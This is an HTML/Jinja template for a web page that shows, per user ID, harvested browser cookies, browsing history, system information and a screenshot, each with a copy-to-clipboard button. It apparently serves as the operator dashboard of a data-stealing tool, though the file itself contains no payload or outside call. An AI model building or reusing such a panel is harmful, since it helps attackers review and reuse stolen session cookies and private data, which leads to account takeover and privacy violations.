<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>User {{ user.username }} Details</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
<header>User {{ user.username }} Details</header>

<div class="container">
  <div class="user-card">
    <p><strong>ID:</strong> {{ user.id }}</p>
    <p><strong>Username:</strong> {{ user.username }}</p>
    <p><strong>Timestamp:</strong> {{ user.timestamp }}</p>

    <h3>Cookies</h3>
    <pre id="cookies" class="json-box">Loading…</pre>
    <button class="action-btn" onclick="copyField('cookies')">Copy Cookies</button>

    <h3>History</h3>
    <pre id="history" class="json-box">Loading…</pre>
    <button class="action-btn" onclick="copyField('history')">Copy History</button>

    <h3>System Info</h3>
    <pre id="system" class="json-box">Loading…</pre>
    <button class="action-btn" onclick="copyField('system')">Copy System Info</button>

    <div id="screenshot-wrap"></div>
  </div>
</div>

<script>
const userId = {{ user.id }};
function showJSON(elemId, obj){
  document.getElementById(elemId).textContent = JSON.stringify(obj, null, 2);
}
function copyField(id){
  const text = document.getElementById(id).textContent;
  navigator.clipboard.writeText(text).then(()=> alert("Copied"));
}

async function loadData(){
  const resp = await fetch(`/api/data/${userId}`, { credentials: 'same-origin' });
  if(!resp.ok){
    const txt = await resp.text();
    document.getElementById('cookies').textContent = 'Error loading';
    document.getElementById('history').textContent = txt;
    return;
  }
  const j = await resp.json();
  showJSON('cookies', j.cookies);
  showJSON('history', j.history);
  showJSON('system', j.system_info);
  if(j.timestamp){
    // optionally update
  }
  // load screenshot (if any) by checking img endpoint
  const imgWrap = document.getElementById('screenshot-wrap');
  try {
    const imgResp = await fetch(`/screenshot/${userId}`, { credentials: 'same-origin' });
    if(imgResp.ok){
      const blob = await imgResp.blob();
      const url = URL.createObjectURL(blob);
      imgWrap.innerHTML = `<h3>Screenshot</h3><img src="${url}" class="screenshot" alt="screenshot">`;
    }
  } catch(e){ /* ignore if none */ }
}

loadData();
</script>
</body>
</html>
